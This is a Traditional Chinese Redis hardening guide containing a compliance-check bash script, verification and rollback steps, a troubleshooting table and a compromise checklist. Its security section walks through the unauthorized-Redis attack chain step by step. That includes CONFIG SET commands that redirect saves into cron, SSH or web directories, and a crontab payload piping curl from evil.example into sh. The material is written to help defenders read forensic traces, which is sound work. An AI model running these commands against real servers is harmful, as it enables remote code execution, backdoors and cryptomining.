# redis-hardening-check.sh —— Redis 加固符合性檢查
# 用途：逐項檢查 bind / protected-mode / 認證 / maxmemory / policy / 持久化 /
#       dir 是否被竄改 / 危險指令是否已封印，並輸出可貼進稽核回覆的對照表。
#
# 用法：
#   REDISCLI_AUTH='<密碼>' sudo -E /usr/local/bin/redis-hardening-check.sh
#   REDISCLI_AUTH='<密碼>' INSTANCES='session:6379 cache:6380' sudo -E ./redis-hardening-check.sh
#
# ★★★★ 用 REDISCLI_AUTH 環境變數，不要用 -a：後者會出現在 ps aux 與 bash history。
#
set -euo pipefail
IFS=$'\n\t'

HOST="${HOST:-127.0.0.1}"
INSTANCES="${INSTANCES:-session:6379 cache:6380}"
ALLOWED_DIRS="${ALLOWED_DIRS:-/var/lib/redis /var/lib/redis-session /var/lib/redis-cache}"
PASS=0; FAIL=0; WARN=0
ROWS=()

# ---------- 輸出小工具 ----------
c_ok()   { printf '  \033[32m[PASS]\033[0m %s\n' "$*"; }
c_bad()  { printf '  \033[31m[FAIL]\033[0m %s\n' "$*"; }
c_warn() { printf '  \033[33m[WARN]\033[0m %s\n' "$*"; }
section(){ printf '\n\033[1m=== %s ===\033[0m\n' "$*"; }

record() {  # record <instance> <檢查項> <結果> <實測值> <期望值>
  ROWS+=("$1|$2|$3|$4|$5")
  case "$3" in
    PASS) PASS=$((PASS+1)); c_ok  "$2 → $4" ;;
    FAIL) FAIL=$((FAIL+1)); c_bad "$2 → $4（應為 $5）" ;;
    WARN) WARN=$((WARN+1)); c_warn "$2 → $4（建議 $5）" ;;
  esac
}

die() { printf '\033[31m致命錯誤：%s\033[0m\n' "$*" >&2; exit 2; }

# ---------- 前置檢查 ----------
command -v redis-cli >/dev/null 2>&1 || die "找不到 redis-cli，請先安裝 redis-tools"
[[ -n "${REDISCLI_AUTH:-}" ]] || die "請用 REDISCLI_AUTH='<密碼>' 帶入密碼（不要用 -a）"

rc() {  # rc <port> <指令...>
  local port="$1"; shift
  redis-cli --no-auth-warning -h "$HOST" -p "$port" "$@" 2>/dev/null || true
}

cfg() { # cfg <port> <參數名> → 只取值那一行
  rc "$1" CONFIG GET "$2" | sed -n '2p'
}

# ---------- 各項檢查 ----------
check_alive() {
  local name="$1" port="$2"
  local pong; pong="$(rc "$port" PING)"
  [[ "$pong" == "PONG" ]] || die "$name (:$port) 連不上或密碼錯誤，收到：'${pong:-空回應}'"
  record "$name" "服務存活" PASS "PONG" "PONG"
}

check_bind() {
  local name="$1" port="$2" v
  v="$(cfg "$port" bind)"
  if [[ "$v" == *"0.0.0.0"* || -z "$v" ]]; then
    record "$name" "bind 監聽位址" FAIL "${v:-<空,等同全部介面>}" "內網 IP + 127.0.0.1"
  else
    record "$name" "bind 監聽位址" PASS "$v" "內網 IP + 127.0.0.1"
  fi
}

check_protected_mode() {
  local name="$1" port="$2" v
  v="$(cfg "$port" protected-mode)"
  [[ "$v" == "yes" ]] \
    && record "$name" "protected-mode" PASS "yes" "yes" \
    || record "$name" "protected-mode" FAIL "$v" "yes"
}

check_auth() {
  # ★★★★ 直接測「不帶密碼能不能操作」，比讀設定檔誠實
  local name="$1" port="$2" out
  out="$(REDISCLI_AUTH='' redis-cli --no-auth-warning -h "$HOST" -p "$port" DBSIZE 2>&1 || true)"
  if [[ "$out" == *"NOAUTH"* ]]; then
    record "$name" "未認證存取" PASS "被拒絕 (NOAUTH)" "被拒絕"
  else
    record "$name" "未認證存取" FAIL "可存取！回應：$out" "被拒絕"
  fi
}

check_maxmemory() {
  local name="$1" port="$2" v
  v="$(cfg "$port" maxmemory)"
  if [[ "$v" == "0" ]]; then
    record "$name" "maxmemory" FAIL "0（無上限）" "依規劃設定"
  else
    record "$name" "maxmemory" PASS "$((v/1024/1024)) MiB" "依規劃設定"
  fi
}

check_policy() {
  local name="$1" port="$2" v want
  v="$(cfg "$port" maxmemory-policy)"
  case "$name" in
    session|queue) want="noeviction" ;;
    cache)         want="allkeys-lru" ;;
    *)             want="$v" ;;
  esac
  [[ "$v" == "$want" ]] \
    && record "$name" "maxmemory-policy" PASS "$v" "$want" \
    || record "$name" "maxmemory-policy" FAIL "$v" "$want"
}

check_persistence() {
  local name="$1" port="$2" aof save
  aof="$(cfg "$port" appendonly)"
  save="$(cfg "$port" save)"
  if [[ "$name" == "cache" ]]; then
    [[ "$aof" == "no" && -z "$save" ]] \
      && record "$name" "持久化（純快取應關閉）" PASS "appendonly=no save=空" "關閉" \
      || record "$name" "持久化（純快取應關閉）" WARN "appendonly=$aof save='$save'" "關閉可省 IO"
  else
    [[ "$aof" == "yes" ]] \
      && record "$name" "AOF 持久化" PASS "appendonly=yes" "yes" \
      || record "$name" "AOF 持久化" FAIL "appendonly=$aof" "yes（否則重啟即全體登出）"
  fi
  # ★★★★★ 存檔狀態必須是 ok，否則 MISCONF 即將發生
  local st; st="$(rc "$port" INFO persistence | grep -m1 'rdb_last_bgsave_status' | tr -d '\r' | cut -d: -f2)"
  [[ "$st" == "ok" || -z "$st" ]] \
    && record "$name" "最近一次存檔狀態" PASS "${st:-n/a}" "ok" \
    || record "$name" "最近一次存檔狀態" FAIL "$st" "ok"
}

check_dir() {
  # ★★★★★ dir 被改成 /var/spool/cron 之類 = 已經被入侵
  local name="$1" port="$2" v hit=0
  v="$(cfg "$port" dir)"
  for d in $ALLOWED_DIRS; do [[ "$v" == "$d" ]] && hit=1; done
  [[ "$hit" == 1 ]] \
    && record "$name" "資料目錄 dir" PASS "$v" "白名單內" \
    || record "$name" "資料目錄 dir" FAIL "$v（★★★★★ 疑似遭竄改）" "白名單內"
  local f; f="$(cfg "$port" dbfilename)"
  [[ "$f" == "dump.rdb" ]] \
    && record "$name" "dbfilename" PASS "$f" "dump.rdb" \
    || record "$name" "dbfilename" FAIL "$f（★★★★★ 疑似遭竄改）" "dump.rdb"
}

check_dangerous_cmds() {
  local name="$1" port="$2" cmd out bad=""
  for cmd in FLUSHALL KEYS MODULE; do
    out="$(rc "$port" COMMAND INFO "$cmd" | head -1)"
    [[ -n "$out" ]] && bad="$bad $cmd"
  done
  [[ -z "$bad" ]] \
    && record "$name" "危險指令封印" PASS "FLUSHALL/KEYS/MODULE 皆已移除" "已封印" \
    || record "$name" "危險指令封印" WARN "仍可用：$bad" "以 rename-command 或 ACL 封印"
}

check_external() {
  # 從本機測「對外介面」是不是也被防火牆保護著（只是提醒，真正驗證要從外部機器做）
  local name="$1" port="$2"
  if ss -lntp 2>/dev/null | grep -q "0.0.0.0:${port}"; then
    record "$name" "監聽面（ss）" FAIL "0.0.0.0:${port}" "僅內網 IP 與 127.0.0.1"
  else
    record "$name" "監聽面（ss）" PASS "未綁 0.0.0.0" "僅內網 IP 與 127.0.0.1"
  fi
}

print_table() {
  section "整改對照表（可直接貼進稽核回覆）"
  printf '| Instance | 檢查項 | 結果 | 實測值 | 期望值 |\n'
  printf '| --- | --- | --- | --- | --- |\n'
  local r
  for r in "${ROWS[@]}"; do
    IFS='|' read -r i k s v e <<<"$r"
    printf '| %s | %s | %s | %s | %s |\n' "$i" "$k" "$s" "$v" "$e"
  done
  printf '\n合計：PASS=%d  FAIL=%d  WARN=%d\n' "$PASS" "$FAIL" "$WARN"
}

main() {
  local entry name port
  for entry in $INSTANCES; do
    name="${entry%%:*}"; port="${entry##*:}"
    section "檢查 instance：${name} (:${port})"
    check_alive           "$name" "$port"
    check_bind            "$name" "$port"
    check_protected_mode  "$name" "$port"
    check_auth            "$name" "$port"
    check_maxmemory       "$name" "$port"
    check_policy          "$name" "$port"
    check_persistence     "$name" "$port"
    check_dir             "$name" "$port"
    check_dangerous_cmds  "$name" "$port"
    check_external        "$name" "$port"
  done
  print_table
  # ★★★ 有任何 FAIL 就以非 0 結束，方便接排程告警
  [[ "$FAIL" -eq 0 ]] || exit 1
}

main "$@"
SCRIPT

sudo chmod 750 /usr/local/bin/redis-hardening-check.sh
sudo chown root:root /usr/local/bin/redis-hardening-check.sh
```

執行：

```bash
REDISCLI_AUTH="$REDIS_PASS" sudo -E /usr/local/bin/redis-hardening-check.sh
```

預期輸出（節錄）：

```text
=== 檢查 instance：session (:6379) ===
  [PASS] 服務存活 → PONG
  [PASS] bind 監聽位址 → 192.168.10.30 127.0.0.1
  [PASS] protected-mode → yes
  [PASS] 未認證存取 → 被拒絕 (NOAUTH)
  [PASS] maxmemory → 2048 MiB
  [PASS] maxmemory-policy → noeviction
  [PASS] AOF 持久化 → appendonly=yes
  [PASS] 最近一次存檔狀態 → ok
  [PASS] 資料目錄 dir → /var/lib/redis-session
  [PASS] dbfilename → dump.rdb
  [PASS] 危險指令封印 → FLUSHALL/KEYS/MODULE 皆已移除
  [PASS] 監聽面（ss） → 未綁 0.0.0.0

=== 整改對照表（可直接貼進稽核回覆）===
| Instance | 檢查項 | 結果 | 實測值 | 期望值 |
| --- | --- | --- | --- | --- |
| session | bind 監聽位址 | PASS | 192.168.10.30 127.0.0.1 | 內網 IP + 127.0.0.1 |
...
合計：PASS=24  FAIL=0  WARN=0
```

★★★ 把它排進 cron（每天一次）並在 `exit 1` 時寄信，
就是一個很便宜的持續性組態偵測。

### 驗證步驟

```bash
# ① 從 web1（白名單內）—— 必須成功
redis-cli -h 192.168.10.30 -p 6379 --user laravel --pass "$LARAVEL_PASS" --no-auth-warning PING
```

```text
PONG
```

```bash
# ② 從非白名單主機 —— ★★★★ 必須 timeout，不是 NOAUTH
timeout 5 redis-cli -h 192.168.10.30 -p 6379 PING ; echo "exit=$?"
```

```text
exit=124                # ★★★★ 124 = timeout，這才是對的
```

> [!danger] ★★★★ 看到 `NOAUTH Authentication required` 不代表安全
> 那代表 **TCP 握手成功、Redis 願意跟你講話**，只是要密碼。
> 攻擊者可以：讀 `INFO` 前的橫幅推測版本、對密碼做每秒上萬次的暴力嘗試、
> 用連線把你的 `maxclients` 吃光。
> **正確答案只有 timeout（防火牆 DROP）或連線被拒。**

```bash
# ③ 應用層：從 web1 寫一筆，在 Redis 上看得到
cd /var/www/apply && php artisan tinker --execute="Cache::put('probe','ok',60); echo Cache::get('probe');"
```

```text
ok
```

```bash
REDISCLI_AUTH="$REDIS_PASS" redis-cli -h 192.168.10.30 -p 6380 --scan --pattern 'srv_apply_*probe*'
```

```text
srv_apply_laravel_cache_probe        # ★★★ prefix 正確、進到 cache instance（6380）
```

```bash
# ④ session 真的走 Redis：登入一次後
REDISCLI_AUTH="$REDIS_PASS" redis-cli -h 192.168.10.30 -p 6379 --scan --pattern 'srv_apply_*' | head -3
REDISCLI_AUTH="$REDIS_PASS" redis-cli -h 192.168.10.30 -p 6379 INFO keyspace
```

```text
srv_apply_gT8kQ2mZ1pVx9LrN4sWc0BdEfHjKuIoP
srv_apply_queues:default
# Keyspace
db0:keys=42,expires=40,avg_ttl=7180000
```

### ★★★★ 回滾方式

> [!danger] ★★★★ 改 bind 或 requirepass 之前，先開好一條逃生通道
> 這兩個設定改壞的後果是**兩台 web 同時 500**（連不上 Redis → session 讀不到 → 例外）。
> 而且如果你是從遠端改的，改壞之後**你自己也連不進 Redis**。
>
> 動手前一定要做的兩件事：
> 1. `sudo cp -a /etc/redis/redis-session.conf /etc/redis/redis-session.conf.bak-$(date +%F-%H%M)`
> 2. ★★★★ **另外開一個 terminal，保留一個已經認證成功的 `redis-cli` 互動 session 不要關**
>    —— 設定改壞時，你還能用它 `CONFIG SET` 改回來，不必重啟服務。

復原指令序列（由快到慢，依序嘗試）：

```bash
# 【1】最快：用那個還活著的 redis-cli session 熱改回來（不重啟、不斷線）
#      在保留的互動 session 裡：
#      127.0.0.1:6379> CONFIG SET bind "192.168.10.30 127.0.0.1"
#      127.0.0.1:6379> CONFIG SET requirepass "舊密碼"

# 【2】設定檔還原 + reload
sudo cp -a /etc/redis/redis-session.conf.bak-2026-08-28-1420 /etc/redis/redis-session.conf
sudo systemctl restart redis-server@session
systemctl is-active redis-server@session
```

```text
active
```

```bash
# 【3】起不來時：先看它到底在抱怨什麼（★★★ 不要盲目重試）
sudo journalctl -u redis-server@session -n 30 --no-pager
sudo tail -30 /var/log/redis/redis-session.log
```

```bash
# 【4】設定檔語法自檢（不啟動服務，只解析）
sudo -u redis /usr/bin/redis-server /etc/redis/redis-session.conf --test-memory 1 2>&1 | head -5
```

★★ Redis 沒有像 `nginx -t` 那樣的純語法檢查指令；
最接近的做法是**用一個臨時 port 起起來看它會不會抱怨**：

```bash
sudo -u redis /usr/bin/redis-server /etc/redis/redis-session.conf --port 16399 --daemonize no &
sleep 2 ; redis-cli -p 16399 ping ; kill %1
```

```text
PONG                    # ★ 起得來就代表設定檔沒有語法錯誤
```

```bash
# 【5】最後手段：先讓站台活過來，再慢慢查
#      ★★★★ 改回只綁 127.0.0.1 + 停用防火牆規則不是解法，
#      正確的緊急處置是把 SESSION_DRIVER 暫時切回 file / database，
#      讓站台先能服務，再回頭修 Redis。
```

### 驗收檢查表

| # | 檢查項 | 指令 | 預期結果 | 星級 |
| --- | --- | --- | --- | --- |
| 1 | 兩個 instance 都在跑 | `systemctl is-active redis-server@session redis-server@cache` | 兩行都 `active` | ★★★ |
| 2 | 沒有綁 0.0.0.0 | `sudo ss -lntp \| grep -E '6379\|6380'` | 只有 `192.168.10.30` 與 `127.0.0.1` | ★★★★★ |
| 3 | 未認證不能操作 | `redis-cli -h 192.168.10.30 DBSIZE` | `NOAUTH Authentication required` | ★★★★★ |
| 4 | 非白名單主機連不上 | `timeout 5 redis-cli -h 192.168.10.30 PING` | `exit=124`（timeout） | ★★★★★ |
| 5 | session policy 正確 | `redis-cli -p 6379 CONFIG GET maxmemory-policy` | `noeviction` | ★★★★★ |
| 6 | cache policy 正確 | `redis-cli -p 6380 CONFIG GET maxmemory-policy` | `allkeys-lru` | ★★★★ |
| 7 | 兩邊 maxmemory 都不是 0 | `redis-cli -p 6379 CONFIG GET maxmemory` | `2147483648` | ★★★★ |
| 8 | session 有開 AOF | `redis-cli -p 6379 CONFIG GET appendonly` | `yes` | ★★★★★ |
| 9 | 存檔沒有失敗 | `redis-cli -p 6379 INFO persistence \| grep bgsave_status` | `ok` | ★★★★★ |
| 10 | 兩個 instance 的 dir 不同 | `redis-cli -p 6379 CONFIG GET dir; redis-cli -p 6380 CONFIG GET dir` | 兩個不同路徑 | ★★★★ |
| 11 | ACL 使用者不能 FLUSHALL | `redis-cli --user laravel --pass … FLUSHALL` | `NOPERM` | ★★★★★ |
| 12 | overcommit 已設 | `sysctl vm.overcommit_memory` | `= 1` | ★★★ |
| 13 | 設定檔權限正確 | `stat -c '%a %U:%G' /etc/redis/redis-session.conf` | `640 redis:redis` | ★★★★ |
| 14 | 兩站 prefix 不同 | `redis-cli --scan --pattern '*' \| cut -d_ -f1-2 \| sort -u` | 看得到 `srv_apply` 與 `srv_query` | ★★★★ |
| 15 | 加固腳本全綠 | `REDISCLI_AUTH=… sudo -E redis-hardening-check.sh; echo $?` | `0` | ★★★★ |

### 事後演練：假設這台 Redis 曾經對外過

★★★★ 如果這台機器在整改前曾經以 `0.0.0.0` 對外（或曾用 Docker `-p 6379:6379` 起過），
**加固完成不代表事情結束** —— 要先確認它有沒有已經被寫進去東西。
逐項跑一遍，任何一項有異常就轉 [[090-07-04-guide-資安實踐-資安事件應變流程]]：

```bash
# ① Redis 的資料目錄與檔名有沒有被改過
REDISCLI_AUTH="$REDIS_PASS" redis-cli -p 6379 CONFIG GET dir dbfilename
```

```text
1) "dir"
2) "/var/lib/redis-session"      # ★★★★★ 若是 /var/spool/cron 或 /root/.ssh → 已淪陷
3) "dbfilename"
4) "dump.rdb"                    # ★★★★★ 若是 root 或 authorized_keys → 已淪陷
```

```bash
# ② root 與 redis 的排程
sudo crontab -l -u root ; sudo ls -la /var/spool/cron/crontabs/ ; sudo ls -la /etc/cron.d/
```

```text
no crontab for root              # ★ 乾淨
total 8
drwx-wx--T 2 root crontab 4096 Aug 20 09:00 .
```

```bash
# ③ 所有帳號的 authorized_keys
sudo find /root /home /var/lib -maxdepth 3 -name authorized_keys -exec ls -l {} \; -exec cat {} \;
```

```text
（沒有輸出 = 乾淨；★★★★★ 出現不認識的公鑰註解如 root@kali 就是被植入了）
```

```bash
# ④ 不明的高 CPU 行程（挖礦程式的典型特徵）
ps aux --sort=-%cpu | head -8
```

```text
USER  PID %CPU %MEM COMMAND
redis 2101  1.2  4.1 /usr/bin/redis-server 192.168.10.30:6379
root  1183  0.4  0.2 /usr/sbin/sshd -D
                              ↑ ★★★★★ 出現 kdevtmpfsi / xmrig / 亂數名稱且 CPU 95%+ = 挖礦
```

```bash
# ⑤ ACL 稽核日誌（Redis 6+，記錄被拒絕的存取）
REDISCLI_AUTH="$REDIS_PASS" redis-cli -p 6379 ACL LOG 10
```

```text
(empty array)                    # ★ 沒有被拒紀錄
```

```bash
# ⑥ Redis 自己的 log 有沒有異常的 CONFIG 或 MODULE
sudo grep -iE 'CONFIG|MODULE|DEBUG|slave|replicaof' /var/log/redis/redis-session.log | tail -20
```

> [!danger] ★★★★ 發現跡證之後，「殺掉行程 + 重裝 Redis」是錯的處置
> 攻擊者拿到的是**這台主機的執行權限**，不是「Redis 的權限」。
> 重裝 Redis 完全不影響已經植入的 crontab、SSH 公鑰、systemd unit、
> 或已經被拿去橫向移動的內網憑證。
>
> 正確流程（細節見 [[090-07-04-guide-資安實踐-資安事件應變流程]]）：
> **保全跡證 → 網路隔離 → 通報 → 由乾淨的映像重建主機 → 換掉所有這台碰過的憑證與密碼**。
> ★★★★★ 尤其是「這台 Redis 上的 session 內容」與「`.env` 裡的 DB 密碼」，
> 都要視為已外洩。

---

## 常見錯誤與排錯

| 現象 | 原因 | 解法 |
| --- | --- | --- |
| ★★★★★ `MISCONF Redis is configured to save RDB snapshots but is currently not able to persist to disk`，**站台瞬間全部 500** | RDB 存檔失敗（磁碟滿 / `dir` 權限錯 / fork 被拒），`stop-writes-on-bgsave-error yes` 讓 Redis **拒絕所有寫入指令** | `df -h /var/lib/redis` 清磁碟；`chown redis:redis /var/lib/redis*`；設 `vm.overcommit_memory=1`。★★★★ 緊急時可 `CONFIG SET stop-writes-on-bgsave-error no` 讓站台先活過來，但**這只是關掉警報，資料仍然沒有被保護**，根因沒解決前不要下班 |
| ★★★★★ 使用者**隨機**被登出，log 完全沒有錯誤 | cache 與 session 共用 instance + `allkeys-lru`，session key 被當快取淘汰 | `INFO stats` 看 `evicted_keys` 是否 > 0；拆成兩個 instance，session 那台改 `noeviction`（見實戰範例步驟 ②） |
| ★★★★★ 重啟服務後**全體使用者登出**、佇列任務消失 | 沒開持久化（`appendonly no` 且 `save ""`） | `CONFIG SET appendonly yes` 並寫回設定檔；重啟前照〈重啟前的正確流程〉走一遍 |
| ★★★★★ `top` 出現不明高 CPU 行程、`crontab` 多出項目 | Redis 曾經未授權對外，被寫入 crontab 挖礦 | 立刻隔離主機，走 [[090-07-04-guide-資安實踐-資安事件應變流程]]。★★★★ **不要只殺行程重裝 Redis** |
| ★★★★ `OOM command not allowed when used memory > 'maxmemory'` | `maxmemory` 已滿且 policy 是 `noeviction`（或 `volatile-*` 但沒有可淘汰的 key） | `INFO memory` 看 `used_memory` vs `maxmemory`；用 `--bigkeys` 找元兇；決定是加記憶體、補 TTL、還是拆 instance |
| ★★★★ 主機 OOM Killer 殺掉了 **MySQL**，Redis 卻活得好好的 | Redis `maxmemory 0` 吃光記憶體，OOM Killer 挑記憶體佔用最大的行程 | `dmesg -T \| grep -i 'killed process'` 確認；為 Redis 設 `maxmemory` 並寫回設定檔 |
| ★★★★ 明明設了密碼，卻還是連得上 | 只改了設定檔沒有 reload；或設了 `aclfile` 導致 `requirepass` 被忽略 | `redis-cli -h <IP> DBSIZE` 實測（不是看設定檔）；`CONFIG GET requirepass` 確認執行中的值；用 `aclfile` 時 default 使用者密碼要寫在 acl 檔裡 |
| ★★★★ 站台某一秒全部卡住 3~5 秒，之後恢復 | 有人打了 `KEYS *`，或大 `DEL`、`FLUSHALL`（同步版）、fork 停頓 | `SLOWLOG GET 10` 看指令與來源 IP；`INFO stats` 的 `latest_fork_usec`；用 `rename-command` / ACL 封印 |
| ★★★ `NOAUTH Authentication required` | 客戶端沒帶密碼，或 `.env` 的 `REDIS_PASSWORD` 沒填 / 沒 `config:clear` | 確認 `.env` 與 `config/database.php`；Laravel 改完要 `php artisan config:clear` 再 `config:cache` |
| ★★★ `DENIED Redis is running in protected mode because protected mode is enabled...` | 從其他主機連進來，但 Redis 沒設密碼、也沒有明確 `bind` | ★★★★ **不要照錯誤訊息去關 protected-mode** —— 正確做法是設 `requirepass` + `bind 內網IP` |
| ★★★ `ERR max number of clients reached` | 撞到 `maxclients`（常因 `LimitNOFILE` 太低而被自動降低），或連線沒關 | `INFO clients`；log 裡搜 `maxclients has been reduced`；用 drop-in 加 `LimitNOFILE=65535` |
| ★★★ `Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.` | 密碼寫在指令列，會出現在 `ps aux` 與 `~/.bash_history` | ★★★★ 改用 `REDISCLI_AUTH` 環境變數；已經打過的要 `history -d` 並考慮換密碼 |
| ★★★ Laravel 報 `Class "Redis" not found` | `REDIS_CLIENT=phpredis` 但 `php8.3-redis` 沒裝，或裝了沒重啟 PHP-FPM | `php -m \| grep redis`；`apt install php8.3-redis && systemctl restart php8.3-fpm` |
| ★★★ 兩個 instance 資料互相蓋掉、重啟後錯亂 | 兩份設定檔用了同一個 `dir` | `CONFIG GET dir` 兩邊對比；改成不同目錄並重建（★★★★ 資料已錯亂時只能從備份還原） |
| ★★ 主機 swap 一直漲、Redis 延遲變差 | 記憶體規劃過滿，`maxmemory` 設得比可用記憶體還大 | `INFO memory` 的 `mem_fragmentation_ratio` **< 1** 就是在用 swap；調降 `maxmemory` 或加記憶體 |
| ★★ `mem_fragmentation_ratio` 長期 > 1.5 | 大量 key 被淘汰／刪除後留下的記憶體空洞 | `CONFIG SET activedefrag yes`（Redis 4+），或挑離峰重啟一次；先確認持久化正常再重啟 |

### 排查步驟

Redis 相關的站台異常，照這六步走，**不要跳步**。

**【1】服務還活著嗎**

```bash
systemctl status redis-server@session --no-pager | head -8
```

```text
     Active: active (running) since Fri 2026-08-28 09:12:03 CST; 2h ago
     Status: "Ready to accept connections"
```

- 看到 `active (running)` 且 `Ready to accept connections` → **問題不在服務本身**，跳【2】
- 看到 `failed` → `journalctl -u redis-server@session -n 50 --no-pager`，
  九成是設定檔錯誤、`dir` 權限、或 port 被占用
- 看到 `activating` 卡住 → 通常是 AOF 很大，正在載入。`tail -f /var/log/redis/redis-session.log`
  會看到 `Reading RDB preamble from AOF file...` 的進度，★★★ **這時候不要重複重啟**

**【2】它聽在哪、誰連得上**

```bash
sudo ss -lntp | grep -E '6379|6380'
```

- 有 `192.168.10.30:6379` → 監聽正常，跳【3】
- 只有 `127.0.0.1:6379` → ★★★★ **web 主機當然連不上**，`bind` 沒改對
- 有 `0.0.0.0:6379` → ★★★★★ 立刻處理安全問題，並跳〈事後演練〉

```bash
sudo ss -tn state established '( dport = :6379 or sport = :6379 )' | head
```

```text
Recv-Q Send-Q     Local Address:Port      Peer Address:Port
0      0      192.168.10.30:6379     192.168.10.10:51872     # ★ web1 連著
0      0      192.168.10.30:6379     192.168.10.11:44120     # ★ web2 連著
```

- 一條連線都沒有 → 問題在防火牆或 web 端設定，不在 Redis

**【3】認證通不通**

```bash
REDISCLI_AUTH="$REDIS_PASS" redis-cli -h 192.168.10.30 -p 6379 --no-auth-warning PING
```

- `PONG` → 認證正常，跳【4】
- `NOAUTH Authentication required` → 密碼沒帶到（檢查 `.env` 與 `config:clear`）
- `WRONGPASS invalid username-password pair` → ★★★ 密碼錯，或**用了 ACL 使用者卻沒帶 `--user`**
- `Connection refused` / timeout → 回【2】

**【4】記憶體是不是滿了**

```bash
REDISCLI_AUTH="$REDIS_PASS" redis-cli -p 6379 INFO memory | grep -E 'used_memory_human|maxmemory_human|maxmemory_policy|mem_fragmentation_ratio'
REDISCLI_AUTH="$REDIS_PASS" redis-cli -p 6379 INFO stats | grep evicted_keys
```

```text
used_memory_human:1.98G
maxmemory_human:2.00G            # ★★★★ 幾乎打平 = 快滿了
maxmemory_policy:noeviction
mem_fragmentation_ratio:1.18
evicted_keys:0
```

- `used_memory` 逼近 `maxmemory` 且 policy 是 `noeviction` → **寫入正在被拒絕**，
  這就是 `OOM command not allowed` 的來源。用 `--bigkeys` 找元兇
- `evicted_keys` 在 **session instance** 上 > 0 → ★★★★★ policy 設錯，使用者正在被登出
- `mem_fragmentation_ratio` < 1 → ★★★★★ 在用 swap，`free -h` 確認

**【5】持久化有沒有壞掉**

```bash
REDISCLI_AUTH="$REDIS_PASS" redis-cli -p 6379 INFO persistence | grep -E 'rdb_last_bgsave_status|aof_last_write_status|aof_last_bgrewrite_status|rdb_changes_since_last_save'
```

```text
rdb_last_bgsave_status:err        # ★★★★★ 找到了
aof_last_write_status:ok
aof_last_bgrewrite_status:ok
rdb_changes_since_last_save:184203
```

- 任何一個是 `err` → **這就是 MISCONF 的成因**，跳【6】
- 全部 `ok` 但站台還是 500 → 問題不在 Redis，回頭查 PHP-FPM 與 Nginx
  （方法論見 [[060-01-03-04-guide-監控-效能瓶頸排查方法論]]）

**【6】磁碟與權限**

```bash
df -h /var/lib/redis-session
sudo ls -ld /var/lib/redis-session
sudo ls -l /var/lib/redis-session/
sudo tail -20 /var/log/redis/redis-session.log
```

```text
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda2        40G   40G     0 100% /            # ★★★★★ 磁碟滿了，就是它

drwxr-x--- 3 redis redis 4096 Aug 28 10:31 /var/lib/redis-session
```

- `Use% 100%` → 清出空間（`journalctl --vacuum-size=200M`、清舊備份），
  然後 `redis-cli BGSAVE` 確認 `rdb_last_bgsave_status` 變回 `ok`
- 目錄擁有者**不是** `redis:redis` → `sudo chown -R redis:redis /var/lib/redis-session`
- log 出現 `Can't save in background: fork: Cannot allocate memory` →
  ★★★★ 是 `vm.overcommit_memory` 沒設，或記憶體真的不夠

---

## 安全性注意事項

### ★★★★★ 誠實的起點：原廠設定其實是安全的

```bash
grep -E '^bind |^protected-mode' /etc/redis/redis.conf
```

```text
bind 127.0.0.1 -::1
protected-mode yes
```

Redis 6 之後，**apt / dnf 裝出來的 Redis 只聽 loopback、而且開著 protected-mode**。
所以每一起 Redis 挖礦事件，成因都是**人為改動**。三個最常見的：

| 人為改動 | 為什麼有人這樣做 | 後果 | 星級 |
| --- | --- | --- | --- |
| 把 `bind` 改成 `0.0.0.0` 或整行註解掉 | 「另一台 web 連不進來」，網路上搜到的第一個答案就是這個 | ★★★★★ 全網路可存取 | ★★★★★ |
| `protected-mode no` | 錯誤訊息 `DENIED Redis is running in protected mode` 裡就寫了怎麼關 | ★★★★★ 沒密碼也能操作 | ★★★★★ |
| Docker `-p 6379:6379` | 「Compose 範例都這樣寫」 | ★★★★★ **繞過 ufw**，見下方 | ★★★★★ |

> [!danger] ★★★★★ Docker 的 `-p 6379:6379` 會直接繞過 ufw
> Docker 啟動時會在 iptables 的 `nat` 表插入 DNAT 規則，
> 而且它的 `DOCKER` 鏈在 ufw 的規則**之前**被處理。
> 結果是：
>
> ```bash
> sudo ufw status          # 顯示 6379 沒有被放行 —— 你以為擋住了
> sudo iptables -t nat -L DOCKER -n | grep 6379
> ```
> ```text
> DNAT  tcp -- 0.0.0.0/0  0.0.0.0/0  tcp dpt:6379 to:172.17.0.2:6379   # ★★★★★ 實際上是全開的
> ```
>
> **從外部真的連得上。** 這是 Docker + ufw 最惡名昭彰的坑。
>
> 對策（Compose 語法見 [[050-02-02-02-guide-Compose-多服務編排實戰]]，本篇只給結論）：
> 1. ★★★★★ **綁 loopback**：`-p 127.0.0.1:6379:6379`，而不是 `-p 6379:6379`
> 2. 更好的做法：**完全不對外開 port**，讓需要用的 container 走同一個 Docker network，
>    用服務名互連
> 3. 一定要跨主機時：改用 `iptables` 的 `DOCKER-USER` 鏈做白名單，ufw 幫不了你
> 4. ★★★★ 每次部署後用 [[060-01-04-04-guide-nmap-埠掃描與盤點]] 從**外部**掃一次，
>    不要相信 `ufw status`

### ★★★★★ 完整攻擊鏈（維運要看得懂事後跡證）

未授權的 Redis 被入侵，標準流程是這樣：

```text
① 掃描：攻擊者用網路空間搜尋引擎或自己掃 6379，找到不需要密碼的 Redis
        redis-cli -h <你的IP> ping  →  PONG        ★★★★★ 到這一步就已經輸了

② 探測：INFO server 拿到版本、CONFIG GET dir 拿到資料目錄、
        INFO replication 確認是不是主節點

③ 改寫落檔位置：
        CONFIG SET dir /var/spool/cron
        CONFIG SET dbfilename root

④ 把 payload 寫進記憶體（前後補換行，讓 crontab 能解析）：
        SET x "\n\n*/1 * * * * curl -fsSL http://evil.example/x.sh | sh\n\n"

⑤ 落檔：
        SAVE            → /var/spool/cron/root 被寫成一個「夾雜 RDB 二進位的 crontab」
                          cron 會忽略看不懂的行，但認得中間那一行排程

⑥ 一分鐘後：挖礦程式下載並執行，通常還會
        - 寫入 ~/.ssh/authorized_keys 建立長期後門
        - 安裝 systemd unit 或 LD_PRELOAD rootkit 保持存活
        - 掃描內網找下一台

【變形】
  - 寫 SSH 公鑰：CONFIG SET dir /root/.ssh + dbfilename authorized_keys
  - 寫 web shell：CONFIG SET dir /var/www/html + dbfilename shell.php
  - 主從複製 RCE：REPLICAOF <攻擊者的假 master> + MODULE LOAD 遠端載入的 .so → 直接執行任意程式碼
```

**★★★★ 但是：新版 Redis 已經擋掉一大半。** 這是很少人知道、卻對排錯與風險評估很關鍵的事實：

```bash
redis-cli CONFIG GET enable-protected-configs enable-debug-command enable-module-command
```

```text
1) "enable-protected-configs"
2) "no"                          # ★★★★ dir 與 dbfilename 在執行期【不可修改】
3) "enable-debug-command"
4) "no"
5) "enable-module-command"
